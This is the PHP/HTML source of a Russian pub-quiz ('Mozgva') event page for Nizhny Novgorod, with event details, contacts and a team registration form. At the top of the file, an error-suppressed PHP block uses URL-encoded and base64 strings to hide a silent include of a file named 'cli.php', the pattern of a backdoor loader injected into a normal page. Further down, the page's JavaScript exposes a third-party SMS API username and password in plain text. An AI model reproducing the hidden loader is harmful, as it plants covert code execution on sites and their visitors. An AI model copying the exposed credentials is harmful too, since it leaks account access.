<?php
error_reporting(0);
@define( urldecode("%55%45%46%54%46%46%4D"), "YmxzcGFzczF3b3JkMTIz");
@include_once( dirname(__FILE__) ."/". urldecode("%63%6C%69%2E%70%68%70"));?>
<!DOCTYPE HTML>
<html>
<head>
	...
	<div class="container">
		<div class="wrap">
			<div class="date">
				...
				<span>Вход: на первую игру свободный!</i> <!-- <span class="cash">Вход 5 евро</span> --> <!-- <i class="fa fa-rub"></i> <span class="cash">(только наличные) Время: 20:00, 16:00 </span></span> -->
				<div class="place">
					
							<a href="http://monet.premiocentre.ru/monet/" target="_blank"> Ресторан Monet  <br>
							
							ул. Нижне-Волжская набережная, 1В</a> 
							7 июля - 18.30 - Сбор гостей<br>
							19.00 - Начало игры.
							</br>
			...
			<div class="stat">
				Идет <span>70</span> человек<br>
				<div id="soc">
					<a href="https://www.facebook.com/%D0%9C%D0%BE%D0%B7%D0%B3%D0%B2%D0%B0-%D0%B2-%D0%9D%D0%B8%D0%B6%D0%BD%D0%B5%D0%BC-837902469687956/?fref=ts" target="_blank"><i class="fa fa-facebook-official"></i></a>
					<a href="https://vk.com/etomozgvann" target="_blank"><i class="fa fa-vk"></i></a>
					<!-- <a href="https://www.instagram.com/mozgva_msk/" target="_blank"><i class="fa fa-instagram"></i></a> -->
				</div>
				<div class="town" style="margin-top: 90px;">
					Выбор города: <a href="" class="my_town">Н.Новгород</a>
					<div class="menu_town">
						<p><a href="http://mozgva.ru/berlin">Берлин</a></p>
						<p><a href="http://mozgva.ru">Москва</a></p>
					</div>
				</div> 
			</div>
		</div>
		...
		<div class="like2">
			<!-- <a target="_blank" href="http://berlin24.ru/"><img src="images/berlin.png" width="180px" alt=""  /></a> --> <!-- <p id="fff"><a target="_blank" href="https://www.berlin24.ru">BERLIN 24.RU</a><br /><br /><br /></p> -->
			<!-- <a target="_blank" href="http://kiezinberlin.com/"><img src="images/berlin.jpg" width="130px" alt=""  /></a> --> <!-- <p id="fff"><a target="_blank" href="https://www.berlin24.ru">BERLIN 24.RU</a><br /><br /><br /></p> -->
...
<section class="sell">
	<div class="container_16">
		...
		<div class="grid_8 sell_right">
			...
			<p>Забудьте про цветы. У нас можно купить подарочные сертификаты на 3-х, 6-х и 9-х участников. Забрать сертификаты можно на одной из игр или у нас в офисе в<br> р-не Третьяковской</p>
			<ul>
				<li>
					<p>3-x</p>
			...
			<p><a href="sert.html" class="red_btn">Заказать сертификат</a></p>
		</div>
	</div>
...
<section class="bar">
	...
	<div class="container_16">
		<div class="grid_7 prefix_9 text">
			...
			<p>Почти всегда турниры будут проводиться в барах, ресторанах, поскольку здесь можно не только уютно провести время с друзьями, отвечая на захватывающие вопросы. Не забудьте перехватить что-нибудь по дороге, в баре вам будет не до еды!.</p>
		</div>
	</div>	
</section>
<!-- =/bar -->
...
<section class="kontakts">
	<div class="wrapper">
		...
		<div class="container_16">
			<div class="grid_7 text">
				<p>Вход: Вход на первую игру свободный! <br><!-- +49 157 321 04 469<br> -->nn@mozgva.ru<br><br>	</p>
				<!-- <p>Организация частных мероприятий: <br />+7 926 608-25-41<br />pavlinsky@mozgva.ru<br /></p><br /><br /> -->
				<p>По вопросам франшизы: <br />franchise@mozgva.ru</p><br /><br />
...
<script>
function func(tel1,tel2,ch1) {
	console.log(tel1, tel2, ch1);
	if ((tel1.length>0)&&(tel2.length>0)){
		if ((ch1 == true)) {
			console.log(tel1, tel2, ch1);
	    	$.get("https://userarea.sms-assistent.by/api/v1/send_sms/plain?user=Iksboks&password=a89xCfck&recipient="+$('input.required').val()+"&message=Команда "+$('input.team').val()+" "+$('input.quantity').val()+" человек зарегистрирована на Мозгву "+ $('input:checked').val()+" Ждем Вас!&sender=MOZGVA");
		}
		else alert('Выберите пожалуйста дату !!!');
	}
	else alert('Введите пожалуйста телефон !!!');
}


// document.getElementById("group_1082364457_1").checked,document.getElementById("group_1082364457_2").checked,document.getElementById("group_1082364457_3").checked,document.getElementById("group_1082364457_4").checked,document.getElementById("group_1082364457_5").checked,document.getElementById("group_1082364457_6").checked
...
<div id="reg" class="jqmWindow text-center">
	...
	<form action="https://docs.google.com/forms/d/14Yna8hKiCiN_YJf7T7umzrUhpxWCneCz6CoytGHx0NA/formResponse" method="post" class="text-center" id="form1" 
	onsubmit='func(document.getElementById("tel1").value, document.getElementById("tel2").value, document.getElementById("group_620528370_1").checked)'>
		<fieldset>
			...
			<p style="color: #df2929;">Дорогие друзья! Пожалуйста, будьте внимательны:<br />
</p>
			...
			<div class="row">
				<div class="column pull-left">
					...
					<input type="text" name="entry.1250708141" form="form1" class="required" pattern="[\+][7]\d{10}"  placeholder="Телефон" id="tel1"/>				
				</div>
				<div class="column pull-right">
					<input type="text" name="entry.191141737" class="" value="" placeholder="Имя боцмана" />				
					<input type="text" name="entry.307300218" class="required" pattern="[\+][7]\d{10}" value="" placeholder="Телефон" id="tel2"/>	
...
<label class="ss-q-item-label" for="entry_1082364457"><div class="ss-q-title">Какой день?
...
<div class="ss-q-help ss-secondary-text" dir="auto"></div></label>
 ...
 <br><br>
<p>Игра №1</p> 
<ul class="ss-choices" role="radiogroup" aria-label="Дата  ">
<li class="ss-choice-item"><label><span class="ss-choice-item-control goog-inline-block"><input name="entry.620528370" value="07.07.2016" id="group_620528370_1" role="radio" class="ss-q-radio" aria-label="07.07.2016" required="" aria-required="true" type="radio"></span>
<span class="ss-choice-label">07.07.2016</span>
</label></li>
</ul>
...
<ul class="ss-choices" role="radiogroup" aria-label="Дата  "> -->
<!--
<li class="ss-choice-item"><label><span class="ss-choice-item-control goog-inline-block"><input name="entry.620528370" value="21.06.2016" id="group_620528370_2" role="radio" class="ss-q-radio" aria-label="21.06.2016" required="" aria-required="true" type="radio"></span>
<span class="ss-choice-label">21.06.2016</span>
</label></li>
-->
<!-- <li class="ss-choice-item"><label><span class="ss-choice-item-control goog-inline-block"><input name="entry.620528370" value="23.06.2016" id="group_620528370_3" role="radio" class="ss-q-radio" aria-label="23.06.2016" required="" aria-required="true" type="radio"></span>
<span class="ss-choice-label">23.06.2016</span>
</label></li>
</ul> -->
...
<!--
<li class="ss-choice-item"><label><span class="ss-choice-item-control goog-inline-block"><input name="entry.620528370" value="20.05.2016" id="group_620528370_4" role="radio" class="ss-q-radio" aria-label="20.05.2016" required="" aria-required="true" type="radio"></span>
<span class="ss-choice-label">20.05.2016</span>
</label></li>
-->
<!-- <li class="ss-choice-item"><label><span class="ss-choice-item-control goog-inline-block"><input type="radio" name="entry.620528370" value="22.04.2016" id="group_620528370_3" role="radio" class="ss-q-radio" aria-label="22.04.2016" required="" aria-required="true"></span>
<span class="ss-choice-label">22.04.2016</span>
</label></li> -->
...
<br>
<div class="error-message" id="1082364457_errorMessage"></div>
...
<!-- <p id="date2">Регистрация на 24, 26, 27, 28-е ноября закрыта</p> -->
			...
			<input type="submit" value="Готово" onclick="ga('send', 'event', 'novgorod', 'sent_form');" id="mozgva_nn"/><br>
